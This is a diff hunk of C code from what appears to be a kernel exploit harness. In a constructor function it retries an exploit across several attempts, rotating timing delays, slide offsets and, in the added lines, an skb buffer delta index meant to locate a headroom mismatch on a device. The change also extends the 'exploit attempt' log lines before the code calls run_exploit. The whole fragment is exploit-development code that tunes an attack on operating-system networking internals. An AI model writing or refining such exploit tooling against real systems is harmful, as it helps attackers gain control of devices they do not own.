@@ -140,19 +140,30 @@ __attribute__((constructor)) static void load(void) {
       char delay[16];
       snprintf(delay, sizeof(delay), "%d", delay_usec);
       SYSCHK(setenv("PSELECT_DELAY_USEC", delay, 1));
+#if defined(SKB_DELTA_CANDIDATES)
+      /*
+       * Rotate skb linear delta candidates across independent attempts so a
+       * Flip6-class headroom mismatch can be found without reflashing.
+       */
+      char delta_idx[16];
+      snprintf(delta_idx, sizeof(delta_idx), "%d", attempt - 1);
+      SYSCHK(setenv("SKB_DELTA_INDEX", delta_idx, 1));
+#endif
 #if defined(APP_PAYLOAD) && defined(SLIDE_P0_OFFSET_CANDIDATES)
       const char *forced_offset = getenv("SLIDE_P0_OFFSET");
       if (forced_offset) {
-        pr_success("exploit attempt=%d/%d pid=%d delay=%d p0_offset=%s\n",
+        pr_success("exploit attempt=%d/%d pid=%d delay=%d p0_offset=%s "
+                   "skb_delta_index=%d\n",
                    attempt, max_attempts, getpid(), delay_usec,
-                   forced_offset);
+                   forced_offset, attempt - 1);
       } else {
-        pr_success("exploit attempt=%d/%d pid=%d delay=%d p0_offset=scan\n",
-                   attempt, max_attempts, getpid(), delay_usec);
+        pr_success("exploit attempt=%d/%d pid=%d delay=%d p0_offset=scan "
+                   "skb_delta_index=%d\n",
+                   attempt, max_attempts, getpid(), delay_usec, attempt - 1);
       }
 #else
-      pr_success("exploit attempt=%d/%d pid=%d delay=%d\n",
-                 attempt, max_attempts, getpid(), delay_usec);
+      pr_success("exploit attempt=%d/%d pid=%d delay=%d skb_delta_index=%d\n",
+                 attempt, max_attempts, getpid(), delay_usec, attempt - 1);
 #endif
       _exit(run_exploit(1, argv));
     }
